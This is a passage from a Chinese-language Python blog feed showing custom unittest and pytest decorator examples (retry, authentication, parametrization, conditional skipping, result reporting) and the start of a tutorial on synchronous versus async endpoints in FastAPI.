class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">if</span> i &lt; attempts - <span class="hljs-number">1</span>:<br>                        time.sleep(delay)<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">f&quot;Test failed after <span class="hljs-subst">&#123;attempts&#125;</span> attempts&quot;</span>)<br>        <span class="hljs-keyword">return</span> wrapper<br>    <span class="hljs-keyword">return</span> decorator<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @retry(<span class="hljs-params">attempts=<span class="hljs-number">3</span>, delay=<span class="hljs-number">2</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为retry的装饰器，它接受两个可选参数：attempts（重试次数，默认为3）和delay（每次重试之间的延迟时间，默认为1秒）。</p><p>retry装饰器内部定义了一个新的装饰器函数（即decorator），它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们使用一个循环来尝试调用原始函数。如果在执行原始函数时抛出了异常，我们将捕获这个异常，并打印出异常信息。</p><p>如果捕获到异常并且还有剩余的重试次数，我们将暂停一段时间（由delay参数指定），然后再次尝试调用原始函数。</p><p>如果所有重试都失败了，我们将重新抛出最后一个捕获到的异常。</p><p>在MyTestCase类中，我们使用@retry装饰器装饰了test_my_api方法，并指定了重试次数和延迟时间。当我们运行这个测试用例时，装饰器会自动重试该方法，直到成功或达到最大重试次数。</p><p>请注意，这个retry装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望对不同类型的异常进行不同的重试策略，或者在重试之间执行一些清理操作等。另外，虽然重试机制可以在某些情况下帮助处理临时性故障，但过度依赖重试可能会掩盖系统中的根本问题。因此，在使用重试机制时应谨慎考虑其适用性和可能的副作用。</p></li></ul><h2 id="权限和认证"><a href="#权限和认证" class="headerlink" title="权限和认证"></a>权限和认证</h2><h3 id="with-auth：为测试函数添加特定的认证信息或权限"><a href="#with-auth：为测试函数添加特定的认证信息或权限" class="headerlink" title="@with_auth：为测试函数添加特定的认证信息或权限"></a>@with_auth：为测试函数添加特定的认证信息或权限</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthManager</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):<br>        self.username = username<br>        self.password = password<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 这里是实际的认证逻辑，例如发送HTTP请求获取访问令牌等</span><br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">with_auth</span>(<span class="hljs-params">username, password</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            auth_manager = AuthManager(username, password)<br>            auth_manager.authenticate()<br>            <span class="hljs-keyword">return</span> func(auth_manager, *args, **kwargs)<br>        <span class="hljs-keyword">return</span> wrapper<br>    <span class="hljs-keyword">return</span> decorator<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @with_auth(<span class="hljs-params"><span class="hljs-string">&quot;test_user&quot;</span>, <span class="hljs-string">&quot;test_password&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self, auth_manager</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/resource&quot;</span><br>        headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span>: auth_manager.access_token&#125;  <span class="hljs-comment"># 假设auth_manager对象有一个access_token属性</span><br>        response = requests.get(url, headers=headers)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为AuthManager的类，它用于管理认证信息和执行认证操作。</p><p>我们定义了一个名为with_auth的装饰器，它接受两个参数：username和password。</p><p>with_auth装饰器内部定义了一个新的装饰器函数（即decorator），它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们创建了一个AuthManager实例，并使用提供的用户名和密码进行初始化。</p><p>我们调用authenticate方法对AuthManager实例进行认证。</p><p>我们将认证后的AuthManager实例传递给原始函数，并返回其结果。</p><p>在MyTestCase类中，我们使用@with_auth装饰器装饰了test_my_api方法，并提供了用户名和密码。当我们运行这个测试用例时，装饰器会先执行认证操作，然后将认证后的AuthManager实例传递给test_my_api方法。</p><p>请注意，这个with_auth装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能需要处理更复杂的认证流程，或者支持多种不同的认证方式等。另外，这个示例中的AuthManager类和authenticate方法只是为了演示目的而编写的，实际使用时应替换为实际的认证逻辑和数据。</p></li></ul><h2 id="参数化测试"><a href="#参数化测试" class="headerlink" title="参数化测试"></a>参数化测试</h2><h3 id="parametrize（使用pytest库）：为测试函数提供多个参数组合"><a href="#parametrize（使用pytest库）：为测试函数提供多个参数组合" class="headerlink" title="@parametrize（使用pytest库）：为测试函数提供多个参数组合"></a>@parametrize（使用pytest库）：为测试函数提供多个参数组合</h3><p>以下是一个使用@pytest.mark.parametrize装饰器（来自pytest库）为测试函数提供多个参数组合的简单示例：</p><p>首先，确保已经安装了pytest库：pip install pytest</p><p>然后，可以使用以下代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>:<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;username, password, expected_status_code&quot;</span>, [</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;password123&quot;</span>, <span class="hljs-number">200</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;invalid_password&quot;</span>, <span class="hljs-number">401</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">400</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">400</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    ]</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_login</span>(<span class="hljs-params">self, username, password, expected_status_code</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/login&quot;</span><br>        payload = &#123;<span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;password&quot;</span>: password&#125;<br>        response = requests.post(url, json=payload)<br>        <span class="hljs-keyword">assert</span> response.status_code == expected_status_code<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pytest.main()<br>    <br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们使用@pytest.mark.parametrize装饰器装饰了test_login方法。该装饰器接受两个参数：一个参数名列表和一个参数值列表。</p><p>参数名列表包含了被装饰的测试函数期望接收的参数名称。</p><p>参数值列表是一个包含多个元组的列表，每个元组代表一组特定的参数值组合。</p><p>当我们运行这个测试用例时，pytest会为test_login方法生成多个实例，每个实例使用一组不同的参数值。这样，我们可以用一种简洁的方式为同一个测试函数提供多个不同的输入和预期输出。</p><p>请注意，虽然这个例子中我们没有使用unittest.TestCase类，但你可以将这个测试用例与unittest.TestCase结合使用，只需要在测试类中继承unittest.TestCase，并使用unittest的断言方法即可。另外，pytest提供了许多其他功能和装饰器，可以根据需要进行探索和使用。</p></li></ul><h2 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h2><h3 id="skip-if：在满足特定条件时跳过测试"><a href="#skip-if：在满足特定条件时跳过测试" class="headerlink" title="@skip_if：在满足特定条件时跳过测试"></a>@skip_if：在满足特定条件时跳过测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">skip_if</span>(<span class="hljs-params">condition</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            <span class="hljs-keyword">if</span> condition:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Test skipped because condition is satisfied: <span class="hljs-subst">&#123;condition&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">return</span> func(*args, **kwargs)<br>        <span class="hljs-keyword">return</span> wrapper<br>    <span class="hljs-keyword">return</span> decorator<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @skip_if(<span class="hljs-params">os.environ.get(<span class="hljs-params"><span class="hljs-string">&quot;SKIP_FLAKY_TESTS&quot;</span>, <span class="hljs-literal">False</span></span>)</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_flaky_api</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/flaky-resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为skip_if的装饰器，它接受一个参数：一个表示条件的表达式。</p><p>skip_if装饰器内部定义了一个新的装饰器函数（即decorator），它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们检查提供的条件是否为真。如果条件为真，我们将打印一条消息并直接返回，从而跳过测试。否则，我们将调用原始函数并返回其结果。</p><p>在MyTestCase类中，我们使用@skip_if装饰器装饰了test_flaky_api方法，并提供了一个条件表达式。这个条件表达式检查环境变量”SKIP_FLAKY_TESTS”是否存在且值为True。如果我们设置了这个环境变量，那么这个测试将被跳过。</p><p>请注意，这个skip_if装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望对不同类型的条件使用不同的装饰器，或者在跳过测试时执行一些清理操作等。另外，虽然跳过测试可以在某些情况下避免不必要的失败和复杂性，但过度依赖跳过机制可能会掩盖系统中的问题。因此，在使用跳过机制时应谨慎考虑其适用性和可能的副作用。</p></li></ul><h3 id="run-only-if：在满足特定条件时执行测试"><a href="#run-only-if：在满足特定条件时执行测试" class="headerlink" title="@run_only_if：在满足特定条件时执行测试"></a>@run_only_if：在满足特定条件时执行测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_only_if</span>(<span class="hljs-params">condition</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> condition:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Test skipped because condition is not satisfied: <span class="hljs-subst">&#123;condition&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">return</span> func(*args, **kwargs)<br>        <span class="hljs-keyword">return</span> wrapper<br>    <span class="hljs-keyword">return</span> decorator<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @run_only_if(<span class="hljs-params">os.environ.get(<span class="hljs-params"><span class="hljs-string">&quot;RUN_SPECIFIC_TESTS&quot;</span>, <span class="hljs-literal">False</span></span>)</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_specific_api</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/specific-resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为run_only_if的装饰器，它接受一个参数：一个表示条件的表达式。</p><p>run_only_if装饰器内部定义了一个新的装饰器函数（即decorator），它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们检查提供的条件是否为真。如果条件为假，我们将打印一条消息并直接返回，从而跳过测试。否则，我们将调用原始函数并返回其结果。</p><p>在MyTestCase类中，我们使用@run_only_if装饰器装饰了test_specific_api方法，并提供了一个条件表达式。这个条件表达式检查环境变量”RUN_SPECIFIC_TESTS”是否存在且值为True。如果我们设置了这个环境变量，那么这个测试将被执行。</p><p>请注意，这个run_only_if装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望对不同类型的条件使用不同的装饰器，或者在执行测试前执行一些初始化操作等。另外，虽然选择性地执行测试可以在某些情况下提高测试效率和针对性，但过度依赖这种机制可能会导致部分测试被忽视或遗漏。因此，在使用run_only_if装饰器时应谨慎考虑其适用性和可能的副作用。</p></li></ul><h2 id="报告和统计"><a href="#报告和统计" class="headerlink" title="报告和统计"></a><strong>报告和统计</strong></h2><h3 id="report-result：自定义测试结果的报告格式或统计数据"><a href="#report-result：自定义测试结果的报告格式或统计数据" class="headerlink" title="@report_result：自定义测试结果的报告格式或统计数据"></a>@report_result：自定义测试结果的报告格式或统计数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomTestResult</span>(unittest.TestResult):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.success_count = <span class="hljs-number">0</span><br>        self.failure_count = <span class="hljs-number">0</span><br>        self.error_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">addSuccess</span>(<span class="hljs-params">self, test</span>):<br>        <span class="hljs-built_in">super</span>().addSuccess(test)<br>        self.success_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">addFailure</span>(<span class="hljs-params">self, test, err</span>):<br>        <span class="hljs-built_in">super</span>().addFailure(test, err)<br>        self.failure_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">addError</span>(<span class="hljs-params">self, test, err</span>):<br>        <span class="hljs-built_in">super</span>().addError(test, err)<br>        self.error_count += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_result</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        result = CustomTestResult()<br>        test_method = <span class="hljs-built_in">getattr</span>(args[<span class="hljs-number">0</span>], func.__name__)<br>        test_method(result)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Test results: <span class="hljs-subst">&#123;result.success_count&#125;</span> successes, <span class="hljs-subst">&#123;result.failure_count&#125;</span> failures, <span class="hljs-subst">&#123;result.error_count&#125;</span> errors&quot;</span>)<br>        <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTestCase</span>(unittest.TestCase):<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setUpClass</span>(<span class="hljs-params">cls</span>):<br>        cls.base_url = <span class="hljs-string">&quot;http://example.com/api&quot;</span><br><span class="hljs-meta">    @report_result</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_my_api</span>(<span class="hljs-params">self, result</span>):<br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.base_url&#125;</span>/resource&quot;</span><br>        response = requests.get(url)<br>        self.assertEqual(response.status_code, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    suite = unittest.TestLoader().loadTestsFromTestCase(MyTestCase)<br>    runner = unittest.TextTestRunner()<br>    runner.run(suite)<br></code></pre></td></tr></table></figure><ul><li><p>在这个例子中：</p><p>我们定义了一个名为CustomTestResult的类，它继承自unittest.TestResult并添加了自定义的计数器属性。</p><p>我们重写了addSuccess、addFailure和addError方法，以便在测试成功、失败或出现错误时更新自定义计数器。</p><p>我们定义了一个名为report_result的装饰器，它接受一个函数作为参数，并返回一个新的函数（即wrapper）。</p><p>在wrapper函数内部，我们创建了一个CustomTestResult实例，并获取被装饰的测试方法。</p><p>我们调用测试方法并将CustomTestResult实例传递给它，以便收集测试结果。</p><p>我们打印出自定义的测试结果报告，包括成功、失败和错误的数量。</p><p>在MyTestCase类中，我们使用@report_result装饰器装饰了test_my_api方法。当我们运行这个测试用例时，装饰器会收集测试结果并打印出自定义的报告。</p><p>请注意，这个report_result装饰器只是一个简单的示例，实际使用中可能需要根据具体需求进行调整。例如，你可能希望生成更复杂的报告格式，或者将报告保存到文件或数据库等。另外，虽然这个例子中我们没有直接使用unittest.TextTestRunner来运行测试，但在实际项目中，你可以将自定义的CustomTestResult类与unittest.TextTestRunner结合使用，以实现更灵活的测试报告功能。</p><p><img src="/img/neom-kirkdJn(2).jpg" alt="unsplash"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI之异步async-await（八）</title>
    <link href="/2024/03/04/688FastAPI8%E4%B9%8B%E5%BC%82%E6%AD%A5async-await/"/>
    <url>/2024/03/04/688FastAPI8%E4%B9%8B%E5%BC%82%E6%AD%A5async-await/</url>
    
    <content type="html"><![CDATA[<h1 id="12-1-fastapi是异步Web框架【重点】"><a href="#12-1-fastapi是异步Web框架【重点】" class="headerlink" title="12-1 fastapi是异步Web框架【重点】"></a>12-1 fastapi是异步Web框架【重点】</h1><p>FastAPI这个web框架是异步框架，那它到底是如何体现异步的呢？</p><p>本质上，<strong>实现异步的方式有三种：多进程、多线程和协程，FastAPI实现异步使用了多线程(线程池)和协程的方式</strong>。</p><ul><li>当我们写普通形式的代码时：即使用 <code>def</code> 定义路径函数，FastAPI内部帮我们使用多线程（线程池）实现异步并发</li><li>当我们写async形式的代码时：即使用 <code>async def</code>定义路径函数，FastAPI内部使用协程的方式实现异步并发。</li><li>在一个项目中，我们可以同时普通函数定义的路径函数（api），和async def 形式定义的路径函数（api）</li><li>但是要记得，在async def 形式定义的函数内，不能使用同步的代码，否则接口的响应速度极慢。</li></ul><h1 id="12-2-比较同步和异步代码【重点】"><a href="#12-2-比较同步和异步代码【重点】" class="headerlink" title="12-2 比较同步和异步代码【重点】"></a>12-2 比较同步和异步代码【重点】</h1><p>在FastAPI中可以使用普通函数定义的接口，也可以使用async def 实行定义的接口。但是使用是需要注意，否则会导致程序极慢。</p><p>示例1：普通函数形式定义的接口，会按照多线程（线程池）的方式异步执行</p><ul><li>比如这个接口，使用<code>time.sleep(5)</code>模拟耗时5s</li><li>当两个客户端同时访问该接口时，服务端就会收到两个请求，因为FastAPI内部使用多线程的方式来处理，一个请求会被一个线程来处理，两个线程几乎同时执行。于是5秒后，两个请求都得到了响应。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    time.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span><br></code></pre></td></tr></table></figure><p>示例2：async def 形式的定义的接口，使用单线程协程的形式异步执行</p><ul><li><p>因为使用了协程的方式，当有两个客户端发请求时，单线程内代码块级别的切换，最终5秒后两个客户端都会得到响应。</p></li><li><p>注意：协程时不能使用同步阻塞的time模块，**需要使用<code>asyncio.sleep()</code>*<em>。又因为它是协程对象，所以需要使用<code>await</code>才能被执行。注意：不可以</em>time.sleep()*</p></li><li><p>另外，<code>await</code>必须使用在<code>async</code>定义的函数内，否则报错。</p></li><li><p>同时注意，在async def 内部不能使用同步模块，否则就会变成单线程同步执行的方式。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span><br></code></pre></td></tr></table></figure><p>示例3：在<strong>协程函数内错误使用同步模块</strong></p><ul><li>因为使用<code>async def</code>定义的函数，所以FadtAPI内部使用单线程的协程方式运行代码，所以当两个客户端发请求时，服务端只有一个线程处理两个请求。</li><li>但因为是同步阻塞5秒，所以只能等第一个请求5秒后处理完，才能开始执行第二个请求。所以第二个请求等待了10秒才能得到响应。(同理，多个客户端发请求就是多个5秒等待)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    time.sleep(<span class="hljs-number">5</span>)<span class="hljs-comment"># 不能在async def 函数内使用同步阻塞模块。</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span><br></code></pre></td></tr></table></figure><p>【注意】</p><ul><li>演示上述代码时，不要在一个浏览器上开两个tab页，可能无法演示出效果。这是因为有些浏览器有设置，一个host之后一个连接，所以打开的两个tab也通用一个和服务端通信的连接，此时的效果就是第一个请求得到响应后才开始第二个响应。</li><li>你可以使用两个不同的浏览器演示示例；或者开两个cmd窗口，使用 curl命令来发请求。</li></ul><p><img src="/img/fastapi/image-20220731111456693.png" alt="image-20220731111456693"></p><h1 id="12-3-同步异步如何选择【重点】"><a href="#12-3-同步异步如何选择【重点】" class="headerlink" title="12-3 同步异步如何选择【重点】"></a>12-3 同步异步如何选择【重点】</h1><p>FastAPI非常灵活，支持你写普通的函数，也支持你写async def 形式的函数，那到底该如何选择？</p><p>下面有几个原则，可以帮助大家做选择：</p><ul><li>你需要使用一个普通的，内部有<strong>IO等待</strong>的<strong>第三方库</strong>，此时使用 <code>def</code></li></ul><figure class="highlight python"><table><tr><td 